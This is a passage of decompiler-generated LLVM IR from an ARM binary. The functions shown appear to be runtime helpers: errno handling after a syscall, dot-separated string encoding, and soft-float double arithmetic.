  uselistorder i32* @sl, { 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 35, 36, 37, 38, 39, 0, 40, 1, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5, 6, 29, 30, 31, 32, 33, 34, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 15, 16, 17, 18, 19, 7, 8, 9, 10, 77, 78, 79, 2, 80, 81, 82, 83, 84, 85, 87, 3, 86, 89, 88, 90, 91, 92, 93, 60, 61, 62, 63, 64, 65, 66, 4, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i32* @sb, { 7, 8, 9, 10, 15, 16, 17, 18, 21, 22, 35, 23, 24, 25, 2, 26, 36, 37, 3, 38, 39, 40, 41, 42, 43, 44, 4, 5, 6, 19, 20, 27, 28, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 49, 50, 51, 11, 12, 13, 14, 60, 63, 61, 62, 64, 52, 53, 54, 55, 56, 57, 58, 0, 59, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 1, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32* @r8, { 19, 20, 21, 22, 23, 24, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 48, 49, 50, 51, 52, 53, 2, 54, 55, 56, 57, 58, 6, 7, 8, 31, 32, 43, 44, 3, 45, 46, 47, 59, 60, 61, 62, 63, 64, 65, 66, 67, 25, 26, 27, 28, 9, 10, 11, 12, 13, 4, 14, 80, 81, 82, 83, 84, 5, 85, 86, 87, 88, 89, 90, 91, 92, 15, 93, 94, 68, 69, 70, 71, 72, 73, 1, 74, 0, 75, 76, 77, 16, 17, 95, 96, 18, 78, 79 }
  uselistorder label %dec_label_pc_179c8, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_1799c, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_17998, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1798c, { 1, 0 }
  uselistorder label %dec_label_pc_178d8, { 1, 0 }
}

define i32 @function_179e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_179e4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_179e4 = load i32, i32* @r7, align 4
  store i32 %v3_179e4, i32* %stack_var_-8, align 4
  %v0_179f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_179f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_179f0, -4095
  br i1 %tmp, label %dec_label_pc_17a10, label %dec_label_pc_17a00

dec_label_pc_17a00:                               ; preds = %dec_label_pc_179e4
  %v0_17a00 = call i32 @function_ce08()
  %v0_17a04 = load i32, i32* %r7.global-to-local, align 4
  %v1_17a04 = sub i32 0, %v0_17a04
  %v2_17a08 = inttoptr i32 %v0_17a00 to i32*
  store i32 %v1_17a04, i32* %v2_17a08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17a10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17a10

dec_label_pc_17a10:                               ; preds = %dec_label_pc_179e4, %dec_label_pc_17a00
  %v1_17a14 = phi i32 [ %v0_179f0, %dec_label_pc_179e4 ], [ -1, %dec_label_pc_17a00 ]
  %v2_17a10 = phi i32 [ %v3_179e4, %dec_label_pc_179e4 ], [ %v2_17a10.pre, %dec_label_pc_17a00 ]
  store i32 %v2_17a10, i32* @r7, align 4
  ret i32 %v1_17a14

; uselistorder directives
  uselistorder i32 %v0_179f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 ()* @function_ce08, { 49, 48, 33, 46, 18, 45, 44, 43, 42, 83, 82, 81, 37, 17, 32, 31, 77, 76, 39, 75, 69, 59, 38, 47, 36, 30, 29, 80, 79, 74, 72, 71, 70, 6, 5, 4, 34, 15, 73, 3, 78, 58, 2, 57, 56, 55, 14, 13, 12, 41, 40, 68, 67, 66, 11, 10, 28, 64, 51, 27, 26, 35, 25, 24, 23, 22, 21, 65, 0, 8, 54, 53, 52, 7, 9, 16, 50, 1, 20, 19, 63, 62, 61, 60 }
  uselistorder i32* @r7, { 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 101, 102, 269, 270, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 130, 131, 132, 133, 134, 135, 136, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 17, 18, 19, 20, 0, 21, 3, 22, 26, 23, 24, 25, 27, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 189, 5, 190, 191, 192, 29, 30, 31, 32, 33, 34, 35, 36, 103, 37, 38, 53, 137, 138, 139, 140, 141, 142, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 6, 227, 228, 229, 230, 231, 232, 233, 1, 234, 235, 236, 237, 271, 7, 272, 275, 276, 94, 8, 95, 96, 97, 98, 99, 100, 39, 40, 45, 46, 47, 48, 41, 42, 43, 44, 49, 50, 51, 52, 314, 315, 316, 317, 75, 76, 277, 278, 28, 65, 66, 67, 68, 69, 70, 71, 318, 319, 320, 323, 324, 9, 54, 55, 124, 10, 125, 126, 127, 2, 128, 129, 57, 58, 4, 59, 56, 77, 78, 11, 79, 60, 61, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 12, 296, 297, 298, 238, 239, 240, 241, 242, 243, 182, 183, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 13, 299, 300, 301, 14, 302, 303, 304, 16, 305, 184, 185, 186, 187, 188, 306, 15, 307, 308, 255, 256, 261, 262, 62, 63, 257, 258, 259, 260, 72, 73, 74, 263, 264, 265, 266, 309, 310, 313, 311, 312, 273, 274, 80, 81, 321, 322, 267, 268, 64 }
  uselistorder label %dec_label_pc_17a10, { 1, 0 }
}

define i32 @function_17a18(i8* %arg1) local_unnamed_addr {
dec_label_pc_17a18:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_17a18 = load i32, i32* @r4, align 4
  store i32 %v3_17a18, i32* %stack_var_-32, align 4
  %v6_17a18 = load i32, i32* @r5, align 4
  %v9_17a18 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_17a20 = load i32, i32* @r1, align 4
  store i32 %v0_17a20, i32* %r8.global-to-local, align 4
  %v0_17a24 = load i32, i32* @r2, align 4
  store i32 %v0_17a24, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a8c23 = icmp slt i8* %arg1, null
  store i1 %v1_17a8c23, i1* %cpsr_n.global-to-local, align 1
  %v2_17a8c24 = icmp eq i8* %arg1, null
  store i1 %v2_17a8c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a8c24, label %dec_label_pc_17aa4, label %dec_label_pc_17a98

dec_label_pc_17a30:                               ; preds = %dec_label_pc_17a98
  %v2_17a30 = call i32 @function_14918(i32 %v0_17a3026, i32 46)
  store i32 %v2_17a30, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a34 = icmp slt i32 %v2_17a30, 0
  store i1 %v1_17a34, i1* %cpsr_n.global-to-local, align 1
  %v2_17a34 = icmp eq i32 %v2_17a30, 0
  store i1 %v2_17a34, i1* %cpsr_z.global-to-local, align 1
  %v0_17a38 = load i32, i32* @r4, align 4
  %v2_17a38 = sub i32 %v2_17a30, %v0_17a38
  store i32 %v2_17a38, i32* @r5, align 4
  br i1 %v2_17a34, label %dec_label_pc_17a40, label %dec_label_pc_17a4c

dec_label_pc_17a40:                               ; preds = %dec_label_pc_17a30
  store i32 %v0_17a38, i32* @r0, align 4
  %v0_17a44 = call i32 @function_f2e0()
  %sext = mul i32 %v0_17a44, 16777216
  %v1_17a48 = sdiv i32 %sext, 16777216
  store i32 %v1_17a48, i32* @r5, align 4
  %v0_17a58.pre = load i32, i32* @r4, align 4
  %v0_17a68.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %dec_label_pc_17a30, %dec_label_pc_17a40
  %v0_17a68 = phi i32 [ %v2_17a30, %dec_label_pc_17a30 ], [ %v0_17a68.pre, %dec_label_pc_17a40 ]
  %v0_17a58 = phi i32 [ %v0_17a38, %dec_label_pc_17a30 ], [ %v0_17a58.pre, %dec_label_pc_17a40 ]
  %v0_17a78 = phi i32 [ %v2_17a38, %dec_label_pc_17a30 ], [ %v1_17a48, %dec_label_pc_17a40 ]
  %v0_17a4c = load i32, i32* %sl.global-to-local, align 4
  %v1_17a4c = add i32 %v0_17a4c, 1
  store i32 %v1_17a4c, i32* %r7.global-to-local, align 4
  %v1_17a50 = load i32, i32* %sb.global-to-local, align 4
  %v2_17a50 = sub i32 %v1_17a50, %v0_17a4c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a54 = icmp slt i32 %v0_17a78, 0
  store i1 %v1_17a54, i1* %cpsr_n.global-to-local, align 1
  %v2_17a54 = icmp eq i32 %v0_17a78, 0
  store i1 %v2_17a54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_17a58, i32* @r1, align 4
  %v0_17a5c = load i32, i32* %r8.global-to-local, align 4
  %v2_17a5c = add i32 %v0_17a5c, %v1_17a4c
  store i32 %v2_17a5c, i32* @r0, align 4
  store i32 %v0_17a78, i32* @r2, align 4
  %v1_17a64 = add i32 %v2_17a50, -1
  store i32 %v1_17a64, i32* @r3, align 4
  %v1_17a68 = add i32 %v0_17a68, 1
  store i32 %v1_17a68, i32* @r4, align 4
  br i1 %v2_17a54, label %dec_label_pc_17ab8, label %dec_label_pc_17a70

dec_label_pc_17a70:                               ; preds = %dec_label_pc_17a4c
  %v2_17a70 = sub i32 %v0_17a78, %v1_17a64
  %v3_17a70 = icmp ult i32 %v0_17a78, %v1_17a64
  %v4_17a70 = xor i32 %v1_17a64, %v0_17a78
  %v5_17a70 = xor i32 %v2_17a70, %v0_17a78
  %v6_17a70 = and i32 %v5_17a70, %v4_17a70
  %v7_17a70 = icmp slt i32 %v6_17a70, 0
  store i1 %v7_17a70, i1* %cpsr_v.global-to-local, align 1
  %v8_17a70 = icmp slt i32 %v2_17a70, 0
  store i1 %v8_17a70, i1* %cpsr_n.global-to-local, align 1
  %v9_17a70 = icmp eq i32 %v0_17a78, %v1_17a64
  store i1 %v9_17a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17a70, label %dec_label_pc_17a78, label %dec_label_pc_17ab8

dec_label_pc_17a78:                               ; preds = %dec_label_pc_17a70
  %v1_17a78 = trunc i32 %v0_17a78 to i8
  %v4_17a78 = add i32 %v0_17a5c, %v0_17a4c
  %v5_17a78 = inttoptr i32 %v4_17a78 to i8*
  store i8 %v1_17a78, i8* %v5_17a78, align 1
  %v0_17a7c = call i32 @function_f350()
  store i32 %v0_17a7c, i32* @r0, align 4
  %v0_17a80 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a80 = icmp slt i32 %v0_17a80, 0
  store i1 %v1_17a80, i1* %cpsr_n.global-to-local, align 1
  %v2_17a80 = icmp eq i32 %v0_17a80, 0
  store i1 %v2_17a80, i1* %cpsr_z.global-to-local, align 1
  %v0_17a84 = load i32, i32* @r5, align 4
  %v1_17a84 = load i32, i32* %r7.global-to-local, align 4
  %v2_17a84 = add i32 %v1_17a84, %v0_17a84
  store i32 %v2_17a84, i32* %sl.global-to-local, align 4
  br i1 %v2_17a80, label %dec_label_pc_17aa4, label %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge

dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge:  ; preds = %dec_label_pc_17a78
  %v0_17a8c.pre = load i32, i32* @r4, align 4
  store i32 %v0_17a8c.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17a8c = icmp slt i32 %v0_17a8c.pre, 0
  store i1 %v1_17a8c, i1* %cpsr_n.global-to-local, align 1
  %v2_17a8c = icmp eq i32 %v0_17a8c.pre, 0
  store i1 %v2_17a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a8c, label %dec_label_pc_17aa4, label %dec_label_pc_17a98

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a18, %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge
  %v0_17a3026 = phi i32 [ %v0_17a8c.pre, %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge ], [ %tmp, %dec_label_pc_17a18 ]
  %v5_17aac525 = phi i32 [ %v2_17a84, %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge ], [ 0, %dec_label_pc_17a18 ]
  %v1_17a98 = inttoptr i32 %v0_17a3026 to i8*
  %v2_17a98 = load i8, i8* %v1_17a98, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17a9c = icmp eq i8 %v2_17a98, 0
  store i1 %v2_17a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17a9c, label %dec_label_pc_17aa4, label %dec_label_pc_17a30

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge, %dec_label_pc_17a78, %dec_label_pc_17a98, %dec_label_pc_17a18
  %v8_17ab0 = phi i32 [ 0, %dec_label_pc_17a18 ], [ %v5_17aac525, %dec_label_pc_17a98 ], [ %v2_17a84, %dec_label_pc_17a78 ], [ %v2_17a84, %dec_label_pc_17a78.dec_label_pc_17a8c_crit_edge ]
  %v0_17aa4 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17aa4 = icmp slt i32 %v0_17aa4, 0
  store i1 %v1_17aa4, i1* %cpsr_n.global-to-local, align 1
  %v2_17aa4 = icmp eq i32 %v0_17aa4, 0
  store i1 %v2_17aa4, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_17aa4, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_17aa4
  %v6_17aac = add i32 %v8_17ab0, 1
  store i32 %v6_17aac, i32* @r0, align 4
  %v7_17ab0 = load i32, i32* %r8.global-to-local, align 4
  %v9_17ab0 = add i32 %v7_17ab0, %v8_17ab0
  %v10_17ab0 = inttoptr i32 %v9_17ab0 to i8*
  store i8 0, i8* %v10_17ab0, align 1
  %v0_17ab4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_17ab4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_17ab4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_17aa4, %bb
  %v2_17ab4 = phi i1 [ %v2_17ab4.pre, %bb ], [ false, %dec_label_pc_17aa4 ]
  %v1_17ab4 = phi i1 [ %v1_17ab4.pre, %bb ], [ %v1_17aa4, %dec_label_pc_17aa4 ]
  %v0_17ab4 = phi i1 [ %v0_17ab4.pre, %bb ], [ %v2_17aa4, %dec_label_pc_17aa4 ]
  %v3_17ab4 = xor i1 %v2_17ab4, %v1_17ab4
  %v4_17ab4 = or i1 %v0_17ab4, %v3_17ab4
  br i1 %v4_17ab4, label %dec_label_pc_17ab8, label %.dec_label_pc_17abc_crit_edge

.dec_label_pc_17abc_crit_edge:                    ; preds = %bb22
  %v1_17ac0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_17abc

dec_label_pc_17ab8:                               ; preds = %dec_label_pc_17a70, %dec_label_pc_17a4c, %bb22
  br label %dec_label_pc_17abc

dec_label_pc_17abc:                               ; preds = %.dec_label_pc_17abc_crit_edge, %dec_label_pc_17ab8
  %v1_17ac0 = phi i32 [ %v1_17ac0.pre, %.dec_label_pc_17abc_crit_edge ], [ -1, %dec_label_pc_17ab8 ]
  %v2_17abc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_17abc, i32* @r4, align 4
  store i32 %v6_17a18, i32* @r5, align 4
  store i32 %v9_17a18, i32* @r6, align 4
  ret i32 %v1_17ac0

; uselistorder directives
  uselistorder i32 %v0_17aa4, { 0, 2, 1 }
  uselistorder i32 %v0_17a8c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17a80, { 1, 0 }
  uselistorder i32 %v2_17a70, { 1, 0 }
  uselistorder i32 %v1_17a64, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_17a78, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_17a48, { 1, 0 }
  uselistorder i1 %v2_17a8c24, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 2, 7, 8, 3, 4, 5, 6, 0 }
  uselistorder i8 0, { 5, 42, 0, 1, 44, 43, 45, 29, 46, 7, 8, 47, 2, 48, 49, 51, 50, 32, 52, 33, 9, 54, 53, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 56, 55, 34, 57, 3, 58, 59, 20, 60, 30, 31, 62, 63, 61, 65, 64, 35, 66, 21, 67, 68, 69, 36, 70, 40, 71, 22, 72, 73, 74, 75, 76, 37, 23, 24, 25, 26, 27, 78, 79, 80, 81, 77, 6, 83, 82, 28, 84, 85, 86, 38, 87, 88, 4, 89, 92, 90, 91, 93, 94, 95, 96, 97, 100, 99, 39, 98, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 41 }
  uselistorder i32 ()* @function_f350, { 21, 20, 19, 16, 15, 14, 13, 12, 11, 26, 18, 17, 10, 3, 8, 7, 1, 6, 5, 4, 0, 25, 24, 23, 22, 9, 2 }
  uselistorder i32 ()* @function_f2e0, { 18, 16, 15, 14, 12, 41, 40, 17, 13, 6, 5, 4, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 10, 9, 8, 7, 25, 24, 23, 22, 21, 20, 19, 11, 2, 0, 1, 3 }
  uselistorder i32 (i32, i32)* @function_14918, { 9, 5, 4, 3, 2, 1, 0, 8, 7, 6 }
  uselistorder i32 46, { 0, 1, 3, 4, 5, 2 }
  uselistorder label %dec_label_pc_17abc, { 1, 0 }
  uselistorder label %dec_label_pc_17ab8, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_17aa4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17a98, { 1, 0 }
  uselistorder label %dec_label_pc_17a4c, { 1, 0 }
}

define i32 @function_17ac4(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ac4:
  %v1_17ac4 = sub i32 0, %arg1
  store i32 %v1_17ac4, i32* @r1, align 4
  %v0_17ac8 = call i32 @function_17ad0()
  ret i32 %v0_17ac8
}

define i32 @function_17acc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17acc:
  %v2_17acc = load i32, i32* @r0, align 4
  ret i32 %v2_17acc
}

define i32 @function_17ad0() local_unnamed_addr {
dec_label_pc_17ad0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17ad0 = load i32, i32* @r4, align 4
  store i32 %v3_17ad0, i32* %stack_var_-12, align 4
  %v6_17ad0 = load i32, i32* @r5, align 4
  %v9_17ad0 = load i32, i32* @lr, align 4
  %v0_17ad4 = load i32, i32* @r1, align 4
  %v2_17ad4 = mul i32 %v0_17ad4, 2
  store i32 %v2_17ad4, i32* %r4.global-to-local, align 4
  %v0_17ad8 = load i32, i32* @r3, align 4
  %v2_17ad8 = mul i32 %v0_17ad8, 2
  store i32 %v2_17ad8, i32* %r5.global-to-local, align 4
  %v4_17adc = icmp eq i32 %v2_17ad8, %v2_17ad4
  %v1_17ae0 = load i32, i32* @r0, align 4
  br i1 %v4_17adc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17ad0
  %v2_17ae0 = load i32, i32* @r2, align 4
  %v5_17ae0 = icmp eq i32 %v2_17ae0, %v1_17ae0
  br i1 %v5_17ae0, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_17ad0, %bb
  %v3_17ae4 = or i32 %v1_17ae0, %v2_17ad4
  %v5_17ae4 = icmp eq i32 %v3_17ae4, 0
  br i1 %v5_17ae4, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_17ae8 = load i32, i32* @r2, align 4
  %v3_17ae8 = or i32 %v2_17ae8, %v2_17ad8
  %v5_17ae8 = icmp eq i32 %v3_17ae8, 0
  br i1 %v5_17ae8, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_17ad4.off = add i32 %v2_17ad4, 4194303
  %tmp = icmp ult i32 %v2_17ad4.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_17ad8.off = add i32 %v2_17ad8, 4194303
  %tmp17 = icmp ult i32 %v2_17ad8.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_17af4 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_17af4, i32 ptrtoint (i32* @global_var_17d2c.711 to i32))
  %v0_17af8 = load i32, i32* %r4.global-to-local, align 4
  %v3_17af8 = udiv i32 %v0_17af8, 2097152
  store i32 %v3_17af8, i32* %r4.global-to-local, align 4
  %v1_17afc = load i32, i32* %r5.global-to-local, align 4
  %v4_17afc = udiv i32 %v1_17afc, 2097152
  %v5_17afc = sub nsw i32 %v4_17afc, %v3_17af8
  %v5_17b00 = icmp ult i32 %v4_17afc, %v3_17af8
  br i1 %v5_17b00, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_17b00 = sub nsw i32 0, %v5_17afc
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_17b00, %bb13 ], [ %v5_17afc, %.thread3 ]
  %v0_17b24 = phi i32 [ %v7_17b00, %bb13 ], [ %v5_17afc, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_17b04 = icmp ugt i32 %v4_17afc, %v3_17af8
  br i1 %v7_17b04, label %dec_label_pc_17b08, label %dec_label_pc_17b24

dec_label_pc_17b08:                               ; preds = %bb14
  %v2_17b08 = add nsw i32 %v0_17b24, %v3_17af8
  store i32 %v2_17b08, i32* %r4.global-to-local, align 4
  %v0_17b0c = load i32, i32* @r0, align 4
  %v1_17b0c = load i32, i32* @r2, align 4
  %v0_17b10 = load i32, i32* @r1, align 4
  %v1_17b10 = load i32, i32* @r3, align 4
  store i32 %v1_17b0c, i32* @r0, align 4
  store i32 %v1_17b10, i32* @r1, align 4
  store i32 %v0_17b0c, i32* @r2, align 4
  store i32 %v0_17b10, i32* @r3, align 4
  br label %dec_label_pc_17b24

dec_label_pc_17b24:                               ; preds = %bb14, %dec_label_pc_17b08
  %tmp18 = icmp ugt i32 %v0_17b24, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_17b24
  %v6_17b28 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_17b28, i32* %r4.global-to-local, align 4
  store i32 %v6_17ad0, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_17b24, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_17ad0)
  %v0_17b30 = load i32, i32* @r1, align 4
  %v3_17b30 = icmp sgt i32 %v0_17b30, -1
  br i1 %v3_17b30, label %dec_label_pc_17b4c, label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %bb16
  %v0_17b44 = load i32, i32* @r0, align 4
  %v1_17b44 = sub i32 0, %v0_17b44
  store i32 %v1_17b44, i32* @r0, align 4
  br label %dec_label_pc_17b4c

dec_label_pc_17b4c:                               ; preds = %bb16, %dec_label_pc_17b44
  %v0_17b4c = load i32, i32* @r3, align 4
  %v3_17b4c = icmp sgt i32 %v0_17b4c, -1
  br i1 %v3_17b4c, label %dec_label_pc_17b64, label %dec_label_pc_17b5c

dec_label_pc_17b5c:                               ; preds = %dec_label_pc_17b4c
  br label %dec_label_pc_17b64

dec_label_pc_17b64:                               ; preds = %dec_label_pc_17b4c, %dec_label_pc_17b5c
  %v0_17b64 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b64 = load i32, i32* %r5.global-to-local, align 4
  %v4_17b64 = icmp eq i32 %v1_17b64, %v0_17b64
  call void @__pseudo_cond_branch(i1 %v4_17b64, i32 ptrtoint (i32* @global_var_17d14.712 to i32))
  %v1_17b68 = load i32, i32* @r0, align 4
  ret i32 %v1_17b68

; uselistorder directives
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_17afc, { 2, 1, 0 }
  uselistorder i32 %v3_17af8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_17ae0, { 1, 0 }
  uselistorder i32 %v2_17ad8, { 1, 3, 0, 2 }
  uselistorder i32 %v2_17ad4, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_17b64, { 1, 0 }
  uselistorder label %dec_label_pc_17b4c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_17b24, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17b6c() local_unnamed_addr {
dec_label_pc_17b6c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_17b6c = load i32, i32* @r4, align 4
  %v1_17b6c = add i32 %v0_17b6c, -1
  store i32 %v1_17b6c, i32* @r4, align 4
  %v0_17b70 = load i32, i32* @r5, align 4
  %v1_17b70 = sub i32 32, %v0_17b70
  store i32 %v1_17b70, i32* @lr, align 4
  %v5_17b74 = icmp sgt i32 %v0_17b70, 32
  br i1 %v5_17b74, label %dec_label_pc_17b90, label %dec_label_pc_17b78

dec_label_pc_17b78:                               ; preds = %dec_label_pc_17b6c
  %v0_17b78 = load i32, i32* @r2, align 4
  %v6_17b78 = shl i32 %v0_17b78, %v1_17b70
  store i32 %v6_17b78, i32* %ip.global-to-local, align 4
  %v0_17b7c = load i32, i32* @r0, align 4
  %v3_17b7c = add i32 %v0_17b70, -1
  %v4_17b7c = shl i32 1, %v3_17b7c
  %v7_17b7c = lshr i32 %v0_17b78, %v0_17b70
  %v8_17b7c = add i32 %v0_17b7c, %v7_17b7c
  %v9_17b7c = icmp ult i32 %v8_17b7c, %v0_17b7c
  %v0_17b80 = load i32, i32* @r1, align 4
  %v2_17b80 = zext i1 %v9_17b7c to i32
  %v3_17b80 = add i32 %v2_17b80, %v0_17b80
  %v1_17b84 = load i32, i32* @r3, align 4
  %v7_17b84 = shl i32 %v1_17b84, %v1_17b70
  %v8_17b84 = add i32 %v7_17b84, %v8_17b7c
  store i32 %v8_17b84, i32* %r0.global-to-local, align 4
  %v5_17b88 = and i32 %v1_17b84, %v4_17b7c
  %v6_17b88 = icmp ne i32 %v5_17b88, 0
  %v7_17b88 = ashr i32 %v1_17b84, %v0_17b70
  %v9_17b88 = add i32 %v3_17b80, %v7_17b88
  %v10_17b88 = zext i1 %v6_17b88 to i32
  %v11_17b88 = add i32 %v10_17b88, %v9_17b88
  br label %dec_label_pc_17bac

dec_label_pc_17b90:                               ; preds = %dec_label_pc_17b6c
  %v1_17b90 = add i32 %v0_17b70, -32
  %v1_17b94 = add i32 %v1_17b70, 32
  store i32 %v1_17b94, i32* @lr, align 4
  %v0_17b9c = load i32, i32* @r3, align 4
  %v2_17b9c = add i32 %v1_17b70, 31
  %v3_17b9c = lshr i32 -2147483648, %v2_17b9c
  %v4_17b9c = and i32 %v0_17b9c, %v3_17b9c
  %v5_17b9c = icmp ne i32 %v4_17b9c, 0
  %v6_17b9c = shl i32 %v0_17b9c, %v1_17b94
  %v2_17ba0 = or i32 %v6_17b9c, 2
  %v2_17ba0.v6_17b9c = select i1 %v5_17b9c, i32 %v2_17ba0, i32 %v6_17b9c
  store i32 %v2_17ba0.v6_17b9c, i32* %ip.global-to-local, align 4
  %v0_17ba4 = load i32, i32* @r0, align 4
  %v7_17ba4 = ashr i32 %v0_17b9c, %v1_17b90
